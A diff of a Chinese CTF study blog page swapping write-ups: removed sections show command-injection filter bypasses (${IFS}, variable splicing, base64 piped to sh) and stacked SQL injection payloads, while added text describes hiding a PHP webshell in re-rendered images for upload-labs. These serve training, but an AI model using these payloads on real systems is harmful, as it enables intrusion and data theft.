@@ -155,7 +155,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nd003frk7kdbida9qc" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawczpoh003iik7kex070f92" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -167,9 +167,9 @@
 
 
   
-    <article id="post-Web/注入漏洞/命令注入/[GXYCTF2019]Ping Ping Ping" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/文件上传/upload-labs/二次渲染绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%5BGXYCTF2019%5DPing%20Ping%20Ping/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -179,206 +179,24 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>​<code>?ip=127.0.0.1;ls</code>​</p>
-<blockquote>
-<p>&#x2F;?ip=<br> PING 127.0.0.1 (127.0.0.1): 56 data bytes<br> flag.php<br> index.php</p>
-<p>滤了空格和标点，flag等符号，不能直接cat flag</p>
-</blockquote>
-<p>‍</p>
-<p>​<code>?ip=127.0.0.1;cat flag.php</code>​</p>
-<blockquote>
-<p>&#x2F;?ip= fxck your space!</p>
-<p>过滤了空格，用<code>$&#123;IFS&#125;$</code>​代替</p>
-</blockquote>
-<p>‍</p>
-<p>​<code>?ip=127.0.0.1;cat$IFSflag.php	</code>​</p>
-<blockquote>
-<p>&#x2F;?ip= fxck your flag!</p>
-</blockquote>
-<p>‍</p>
-<p>不读flag，读index</p>
-<blockquote>
-<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//会去获得浏览器中的content-type</span></span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);<span class="comment">//使用上传的图片生成新的图片,文件的重写，二次渲染</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;         </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>总结：过滤的特殊字符：</strong></p>
 <blockquote>
-<p>&amp; &#x2F; ？ * &lt; x{00}-\x{1f} ‘ “ \ () [] {}  空格<br>“xxxfxxxlxxxaxxxgxxx” “ “ “bash”</p>
+<p>经过二次渲染以后的图片马，将不会保留一句话木马，只保留图片的原始信息</p>
 </blockquote>
-<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
+<p>所以要绕过，我们就去找二次渲染后的图片，然后比较和之前的图片相同的地方，然后因为那里面是不会被二次渲染的，我们在那里插入我们的一句话木马</p>
 <blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote>
-<p>源码中有一个$a变量可以覆盖</p>
-<blockquote>
-<p>?ip&#x3D;127.0.0.1;a&#x3D;f;cat$IFS$1$alag.php    过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;l;cat$IFS$1f$aag.php	没flag<br>?ip&#x3D;127.0.0.1;a&#x3D;a;cat$IFS$1fl$ag.php  	过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php	有flag<br>?ip&#x3D;127.0.0.1;a&#x3D;fl;b&#x3D;ag;cat$IFS$1$a$b.php 过滤<br>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php 有flag</p>
+<p>但是推荐用gif，因为gif的二次渲染的相匹配的更多</p>
 </blockquote>
-<p>变量替换顺序，效果也不一样</p>
-<h3 id="1、简单变量替换，用-a覆盖拼接flag"><a href="#1、简单变量替换，用-a覆盖拼接flag" class="headerlink" title="1、简单变量替换，用$a覆盖拼接flag"></a>1、简单变量替换，用$a覆盖拼接flag</h3><p>​<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code>​</p>
-<p>​<code>查看源码</code>​</p>
-<p>&#x2F;?ip=</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes &lt;?php $flag =</span><br><span class="line"></span><br><span class="line">“flag&#123;d893b431-5300-4b46-9b52-3a5a2390cfca&#125;”; ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h3 id="2、变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#2、变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="2、变量ab互换传递，绕过字符串匹配，实现拼接"></a>2、变量ab互换传递，绕过字符串匹配，实现拼接</h3><p>​<kbd>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</kbd>​</p>
-<p>​<kbd>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</kbd>​</p>
-<p>‍</p>
-<h3 id="3、内联执行"><a href="#3、内联执行" class="headerlink" title="3、内联执行"></a>3、内联执行</h3><blockquote>
-<p>?ip&#x3D;127.0.0.1;cat$IFS<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$3<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​<br>?ip&#x3D;127.0.0.1|cat$IFS$9<code>ls</code>​</p>
-</blockquote>
-<p>‍</p>
-<h3 id="4、被过滤的bash，用管道-sh替换"><a href="#4、被过滤的bash，用管道-sh替换" class="headerlink" title="4、被过滤的bash，用管道+sh替换"></a>4、被过滤的bash，用管道+sh替换</h3><p>cat flag.php用base64加密来绕过正则匹配</p>
-<blockquote>
-<p>Y2F0IGZsYWcucGhw</p>
-</blockquote>
-<blockquote>
-<p>?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</p>
-</blockquote>
-<p>&#x2F;&#x2F;?ip= fxck your bash!</p>
-<p> 过滤了flag、bash，但sh没过滤，linux下可用sh</p>
-<p>​<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>​</p>
-<p>|sh 就是执行前面的echo脚本</p>
-<p>‍</p>
-<h3 id="5、类似题的大概思路"><a href="#5、类似题的大概思路" class="headerlink" title="5、类似题的大概思路"></a>5、类似题的大概思路</h3><blockquote>
-<p>cat fl*  用<em>匹配任意<br>cat fla</em> 用*匹配任意<br>ca\t fla\g.php        反斜线绕过<br>cat fl’’ag.php        两个单引号绕过<br>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash<br>&#x2F;&#x2F;base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</p>
-<p>echo “63617420666c61672e706870” | xxd -r -p | bash<br>&#x2F;&#x2F;hex编码绕过(引号可以去掉)</p>
-<p>echo “63617420666c61672e706870” | xxd -r -p | sh<br>&#x2F;&#x2F;sh的效果和bash一样</p>
-<p>cat fl[a]g.php       用[]匹配</p>
-<p>a&#x3D;fl;b&#x3D;ag;cat $a$b          变量替换<br>cp fla{g.php,G}    把flag.php复制为flaG<br>ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的</p>
-</blockquote>
-<p>‍</p>
-<p>通配符</p>
-<blockquote>
-<ul>
-<li>#匹配全部字符，通配符<br>?    #任意一个字符，通配符<br>[]      #表示一个范围（正则，通配符）<br>{}      #产生一个序列（通配符）</li>
-</ul>
-</blockquote>
-<p><img src="/.com//b1bf09fa6702388534a63ae4b934053c-20250416004020-dh62fi5.png" alt="b1bf09fa6702388534a63ae4b934053c"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/[GXYCTF2019]Ping%20Ping%20Ping/" data-id="cmawcq0nd003hrk7k0e9b6a6c" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[GYCTF2020]Blacklist" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[GYCTF2020]Blacklist/" data-id="cmawcq0ne003krk7k22i20y8f" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[强网杯 2019]随便注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
-<p>先判断注入点的传参方式，发现是get传参。</p>
-</blockquote>
-<blockquote>
-<p>判断闭合方式：输入1再输入1’试试	，发现是字符型且闭合方式是单引号</p>
-</blockquote>
-<blockquote>
-<p>判断一下字符个数<code>&#39; union select 1,2;#</code>​，系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;select&#x3D;&#x3D;关键字无法使用，我们可以通过&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;的方式，来绕过select关键字。</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;查看数据库名：&#x3D;&#x3D;​<code>1&#39;;show databases;#</code>​</p>
-</blockquote>
-<p><img src="/.com//image-20250418170120-z5w8c3n.png" alt="image">​</p>
-<blockquote>
-<p>&#x3D;&#x3D;查看数据表：&#x3D;&#x3D;​<code>1&#39;;show tables;#</code>​</p>
-</blockquote>
-<p><img src="/.com//image-20250418170223-5ylj1zk.png" alt="image"></p>
-<blockquote>
-<p>查看表结构：</p>
-<p>方式一：<code>1&#39;; show columns from tableName;#</code>​</p>
-<p>方式二：<code>1&#39;;desc tableName;#</code>​</p>
-<p>注意，如果tableName是纯数字，需要用反引号包裹</p>
-</blockquote>
-<p><img src="/.com//image-20250418170425-ugseo8r.png" alt="image"></p>
-<blockquote>
-<p>因为select关键字被过滤了，所以我们可以通过&#x3D;&#x3D;预编译&#x3D;&#x3D;的方式&#x3D;&#x3D;拼接&#x3D;&#x3D;select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE  hacker;#</code>​得flag：flag{c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3}  （关于预编译的讲解请见下文）</p>
-</blockquote>
-<p>‍</p>
-<p>‍</p>
 <h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
-<p>前几步和方法一一致，最后一步（第8步），我们可以直接将<code>select * from `1919810931114514` </code>​语句进行16进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>​，替换payload：</p>
-<p>​<code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE  hacker;#</code>​</p>
-<p>同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</p>
-<p>​<code>1&#39;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</code>​</p>
+<p>php二次渲染不会重复多次渲染，我们可以检测二次渲染过后的再上传再看，然后再在二次渲染的图片中插入一句话木马，有可能不会被二次渲染掉</p>
 </blockquote>
 <p>‍</p>
-<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><blockquote>
-<p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>​我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：<code>1&#39;;  alter table words rename to words1;alter table `1919810931114514`  rename to words;alter table words change flag id varchar(50);# </code>​，然后通过<code>1&#39; or 1 = 1 #</code>​，成功获取到flag。 （关于更改表名的讲解请见下文）</p>
-</blockquote>
-<p>‍</p>
-<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><blockquote>
-<p>此题还可以通过&#x3D;&#x3D;handle&#x3D;&#x3D;直接出答案：<code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code>​</p>
-</blockquote>
-<p>‍</p>
-<p>‍</p>
-<h1 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h1><h2 id="1-预编译"><a href="#1-预编译" class="headerlink" title="1.预编译"></a>1.预编译</h2><p>预编译相当于定一个语句相同，参数不通的&#x3D;&#x3D;mysql&#x3D;&#x3D;模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
-<p>格式：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE 名称 FROM 	Sql语句 ? ;</span><br><span class="line">SET @x=xx;</span><br><span class="line">EXECUTE 名称 USING @x;</span><br></pre></td></tr></table></figure>
-
-<p>举例：查询ID为1的用户：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">SElECT * FROM t_user WHERE USER_ID = 1</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">EXECUTE jia;</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line">PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;</span><br><span class="line">SET @ID = 1;</span><br><span class="line">EXECUTE jia USING @ID;</span><br><span class="line"></span><br><span class="line">方法四：</span><br><span class="line">SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">PREPARE jia FROM @SQL;</span><br><span class="line">EXECUTE 